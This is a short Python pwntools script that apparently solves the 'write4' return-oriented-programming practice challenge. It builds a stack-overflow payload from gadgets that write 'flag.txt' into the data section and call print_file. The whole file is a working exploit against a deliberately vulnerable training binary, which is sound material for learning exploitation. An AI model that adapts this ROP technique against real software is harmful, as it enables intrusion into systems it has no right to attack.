#! /usr/bin/env python
from pwn import *



gadget1 = 0x0400690 #pop r14 ; pop r15 ; ret

gadget2 = 0x0400628 #mov qword ptr [r14], r15 ; ret

gadget3 = 0x0400693 #pop rdi ; ret

dataSect = 0x0601028

print_file_plt = 0x400510

payload = 'A'*40

r15 = 'flag.txt'

payload += p64(gadget1) + p64(dataSect) + flat(r15,length=8,filler='\x00') + p64(gadget2) #write string flag.txt to data section
#r15 = '.txt'
#payload += p64(gadget1) + p64(dataSect+8) + flat(r15, length=8, filler='\x00') + p64(gadget2)

payload += p64(gadget3) + p64(dataSect)

payload += p64(print_file_plt)

print(payload)
'''
elf = ELF('./write4')

proc = elf.process()

proc.recvuntil('> ')

proc.sendline(payload)

proc.interactive()
'''